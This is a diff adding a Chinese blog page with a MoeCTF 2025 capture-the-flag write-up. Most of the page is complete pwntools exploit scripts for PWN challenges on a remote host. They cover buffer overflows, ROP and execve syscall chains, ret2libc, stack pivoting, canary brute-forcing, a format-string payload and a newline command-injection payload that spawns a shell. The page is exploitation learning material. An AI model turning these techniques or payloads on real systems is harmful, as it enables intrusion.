@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>haoo&#39;s tech blog - MoeCTF_2025</title>
+<meta name="description" content="PWN前面的几道题是基础的题目，就不再赘述了 boom&amp;#x2F;boom_revengefrom pwn import*io=remote(&amp;#x27;61.139.2.1&amp;#x27;,56079)#io=process(&amp;#x27;./boom&amp;#x27;)recv_data=os.popen(&amp;#x27;./ra">
+<meta name="theme-color" content="#090c0b">
+<meta name="color-scheme" content="dark">
+<script>
+  (function () {
+    try {
+      var palette = localStorage.getItem('startrace-palette');
+      if (['green', 'cyan', 'amber'].includes(palette)) document.documentElement.dataset.palette = palette;
+    } catch (error) {}
+  })();
+</script>
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="alternate" type="application/rss+xml" title="haoo&#39;s tech blog RSS" href="/rss.xml">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="site-body">
+  
+  <header class="site-header">
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="site-header__inner">
+    <a class="site-brand" href="/" aria-label="haoo&#39;s tech blog 首页">
+      <span class="site-brand__mark" aria-hidden="true">0x</span>
+      <span class="site-brand__text">
+        <strong>haoo&#39;s tech blog</strong>
+      </span>
+    </a>
+
+    <nav id="site-nav" class="site-nav" aria-label="主导航">
+      
+      
+        <a class="site-nav__link" href="/">首页</a>
+      
+        <a class="site-nav__link" href="/categories">知识库</a>
+      
+        <a class="site-nav__link" href="/tags">标签</a>
+      
+        <a class="site-nav__link" href="/about">关于</a>
+      
+        <a class="site-nav__link" href="/links">链接</a>
+      
+        <a class="site-nav__link" href="/rss.xml">RSS</a>
+      
+    </nav>
+
+    <button class="command-toggle" type="button" data-command-open aria-label="打开命令行" aria-keyshortcuts="Control+K">
+      <span aria-hidden="true">&gt;_</span>
+      <span>Console</span>
+      <kbd>Ctrl K</kbd>
+    </button>
+
+    <button class="palette-toggle" type="button" data-palette-toggle aria-label="切换主题配色" title="切换主题配色">
+      <span class="palette-toggle__swatch" aria-hidden="true"></span>
+      <span data-palette-label>绿色</span>
+    </button>
+
+    <button class="menu-toggle" type="button" aria-label="打开导航" aria-expanded="false" aria-controls="site-nav">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </div>
+  <div class="reading-progress" aria-hidden="true"><span></span></div>
+</header>
+
+
+  <main id="main-content" class="site-main article-main">
+    <article class="article-wrap">
+      <header class="article-header">
+        <div class="post-meta">
+          <span>4247 字</span>
+        </div>
+        <h1>MoeCTF_2025</h1>
+        
+          <div class="tag-list">
+            
+              <a class="tag-chip tag-chip--solid" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+            
+            
+              <a class="tag-chip" href="/tags/ctf/">ctf</a>
+            
+          </div>
+        
+      </header>
+
+      <div class="article-grid">
+        <div class="article-body article-prose" id="article-content">
+          <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>前面的几道题是基础的题目，就不再赘述了</p>
+<h2 id="boom-boom-revenge"><a href="#boom-boom-revenge" class="headerlink" title="boom&#x2F;boom_revenge"></a>boom&#x2F;boom_revenge</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;61.139.2.1&#x27;,56079)<br>#io=process(&#x27;./boom&#x27;)<br><br>recv_data=os.popen(&#x27;./random&#x27;).read()<br>list=recv_data.strip(&#x27;\n&#x27;)<br>list=recv_data.split(&#x27;\n&#x27;)<br><br>canary=list[0]<br>print(int(canary))<br><br>io.sendline(b&#x27;y&#x27;)<br><br>payload=p32(int(canary))*38+p64(0x040101a)+p64(0x401276)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>简单的fmt，一读一写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">%10$p---%7$s<br></code></pre></td></tr></table></figure>
+
+<p>再将第一个转换成相应的字符串，因为是小端序，再倒过来，输入两个字符串即可获取shell。</p>
+<h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><p>因为没禁用\n，就指令连接一下即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;61.139.2.1&#x27;,55479)<br><br>payload=b&#x27;\nsh -c sh&#x27;<br>io.sendline(b&#x27;4&#x27;)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="randomlock"><a href="#randomlock" class="headerlink" title="randomlock"></a>randomlock</h2><p>一样打随机数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;61.139.2.1&#x27;,63030)<br><br>recv_data=os.popen(&#x27;./random&#x27;).read()<br>list=recv_data.strip(&#x27;\n&#x27;)<br>list=recv_data.split(&#x27;\n&#x27;)<br><br>for i in range(10):<br>    payload=list[i]<br>    io.sendlineafter(b&#x27;&gt;&#x27;,str(payload))<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="str-check"><a href="#str-check" class="headerlink" title="str_check"></a>str_check</h2><p>strcpy与memcpy的区别就是前者以\0结束不一定到n字节，后者一定到n字节。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;61.139.2.1&#x27;,54112)<br><br>payload=b&#x27;meow&#x27;+b&#x27;\x00&#x27;*(0x28-4)+p64(0x040101a)+p64(0x401236)<br><br>io.sendline(payload)<br>io.sendline(b&#x27;256&#x27;)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="syslock"><a href="#syslock" class="headerlink" title="syslock"></a>syslock</h2><p>打系统调用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;61.139.2.1&#x27;,60959)<br><br>rax=0x0401244<br>rdi_rsi_rdx=0x0401240<br>bin_sh=0x0404084<br>syscall=0x0401230<br><br>io.sendafter(b&#x27;mode\n&#x27;,b&#x27;-32&#x27;)<br><br>payload=p32(0x3b)+b&#x27;/bin/sh\x00&#x27;<br>io.sendafter(b&#x27;password\n&#x27;,payload)<br><br>payload=cyclic(0x40+8)+p64(rdi_rsi_rdx)+p64(bin_sh)+p64(0)+p64(0)+p64(rax)+p64(0x3b)+p64(syscall)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="xdulaker"><a href="#xdulaker" class="headerlink" title="xdulaker"></a>xdulaker</h2><p>开启了PIE保护，但给了opt地址，直接获取基址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;61.139.2.1&#x27;,53396)<br>#io=process(&#x27;./xdulaker&#x27;)<br><br>io.sendline(b&#x27;1&#x27;)<br>io.recvuntil(b&#x27;:0x&#x27;)<br>opt=int(io.recv(12),16)<br>print(hex(opt))<br>base_addr=opt-0x04010<br>backdoor=base_addr+0x01249<br>ret=base_addr+0x0101a<br><br>io.sendline(b&#x27;2&#x27;)<br>payload=cyclic(0x20)+b&#x27;xdulaker&#x27;<br>io.sendlineafter(b&#x27;name?!&#x27;,payload)<br><br>io.sendline(b&#x27;3&#x27;)<br>payload=cyclic(0x30+8)+p64(ret)+p64(backdoor)<br>io.sendlineafter(b&#x27;xdulaker&#x27;,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ezlibc"><a href="#ezlibc" class="headerlink" title="ezlibc"></a>ezlibc</h2><p>简单的ret2libc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>elf = ELF(&#x27;./ezlibc&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>p = remote(&#x27;61.139.2.1&#x27;,62108)<br>p.recvuntil(b&#x27;How can I use &#x27;)<br>elf_leak = int(p.recv(14),16)<br>elf_base = elf_leak - 0x1060<br>print(&#x27;elf base = &#x27;,hex(elf_base))<br>payload = b&#x27;a&#x27; * 0x20 + p64(0xdeadbeef) + p64(elf_base + 0x11EE)<br><br><br>p.send(payload)<br>p.recvuntil(b&#x27;How can I use &#x27;)<br>leak = int(p.recv(14),16)<br>print(&#x27;leak:&#x27;, hex(leak))<br>libc_base = leak - 0x1147d0<br>print(&#x27;libc_base:&#x27;, hex(libc_base))<br>system = libc_base + libc.symbols[&#x27;system&#x27;]<br>print(&#x27;system:&#x27;, hex(system))<br>binsh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br>print(&#x27;binsh:&#x27;, hex(binsh))<br>ret = libc_base + 0x29139<br>rdi = libc_base + 0x2a3e5<br><br>payload = b&#x27;a&#x27; * 0x20 + p64(0xdeadbeef) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ezprotection"><a href="#ezprotection" class="headerlink" title="ezprotection"></a>ezprotection</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br><br>while True:<br>    io=remote(&#x27;61.139.2.1&#x27;,64627)<br>    io.send(b&#x27;a&#x27;*25)<br>    io.recvuntil(b&#x27;a&#x27;*25)<br><br>    canary=b&#x27;\x00&#x27;+io.recv(7)<br>    print(canary)<br><br><br>    payload=cyclic(0x20-8)+canary+p64(0xdeadbeef)+p16(0x127D)<br>    io.send(payload)<br>    out=io.recvall(1)<br>    if out.find(b&#x27;moectf&#x27;)!= -1:<br>        print(out)<br>        break<br>    else:<br>        io.close()<br>        continue<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ezpivot"><a href="#ezpivot" class="headerlink" title="ezpivot"></a>ezpivot</h2><p>打栈迁移，但是要抬栈到很高的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import * <br>sh = remote(&quot;61.139.2.1&quot;,55439)<br> <br>context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)<br> <br>elf = ELF(&quot;./ezpivot&quot;)<br> <br>sh.recvuntil(b&quot;introduction.\n&quot;)<br>sh.sendline(str(-1)) <br> <br>ret = 0x40101a<br>rdi_ret = 0x0401219<br>desc = 0x404060<br>leave_ret = 0x0040120f<br>system = 0x0401230<br> <br>payload1 = b&quot;/bin/sh\x00&quot; +b&quot;\x00&quot;*(0x600-0x8+0x100)+p64(desc)+p64(desc)<br>payload1 += p64(rdi_ret)+p64(desc)+p64(ret)+p64(system)<br> <br>sh.sendline(payload1)<br>sleep(0.1)<br>sh.recvuntil(b&quot;number:\n&quot;)<br> <br> <br>payload2 = b&quot;a&quot;*12+p64(desc+0x600-0x8+0x100+0x10)+p64(leave_ret)<br>sh.sendline(payload2)<br>sleep(0.1)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="fmt-S"><a href="#fmt-S" class="headerlink" title="fmt_S"></a>fmt_S</h2><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="入门指北"><a href="#入门指北" class="headerlink" title="入门指北"></a>入门指北</h2><p>直接放入ida+shift+f12即可找到flag。</p>
+<h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>直接base64解码即可获得flag。</p>
+
+        </div>
+
+        
+          <aside class="toc-panel" aria-label="文章目录">
+            <div class="toc-panel__head">
+              <h2>目录</h2>
+              <button class="toc-top" type="button">顶部</button>
+            </div>
+            <nav id="toc"></nav>
+          </aside>
+        
+      </div>
+
+      <nav class="article-nav" aria-label="文章导航">
+        
+          <a href="/pwnable-tw/">
+            <span>上一篇</span>
+            <strong>pwnable_tw</strong>
+          </a>
+        
+        
+          <a href="/XYCTF2024/">
+            <span>下一篇</span>
+            <strong>XYCTF2024</strong>
+          </a>
+        
+      </nav>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>31 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p>&copy; haoo · powered by Hexo</p>
+  </div>
+</footer>
+<dialog
+  id="command-console"
+  class="command-console"
+  aria-labelledby="command-title"
+  data-search-url="/search.json"
+  data-home-url="/"
+  data-categories-url="/categories"
+  data-tags-url="/tags"
+  data-about-url="/about"
+  data-links-url="/links"
+>
+  <div class="command-console__bar">
+    <div>
+      <span class="command-console__status" aria-hidden="true"></span>
+      <strong id="command-title">haoo@blog:~</strong>
+    </div>
+    <button class="command-console__close" type="button" data-command-close aria-label="关闭命令行">ESC</button>
+  </div>
+
+  <div id="command-output" class="command-console__output" role="log" aria-live="polite" aria-relevant="additions">
+    <div class="command-message command-message--accent">Startrace interactive shell v1.0</div>
+    <div class="command-message">输入 <code>help</code> 查看命令，按 <kbd>Ctrl K</kbd> 随时打开。</div>
+  </div>
+
+  <form id="command-form" class="command-console__form" autocomplete="off">
+    <label for="command-input"><span aria-hidden="true">visitor@blog:~$</span><span class="visually-hidden">输入命令</span></label>
+    <input id="command-input" name="command" type="text" inputmode="text" autocapitalize="off" spellcheck="false" aria-describedby="command-hint">
+    <span class="command-console__cursor" aria-hidden="true"></span>
+  </form>
+  <p id="command-hint" class="command-console__hint">help · ls · cd · open · search · clear</p>
+</dialog>
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
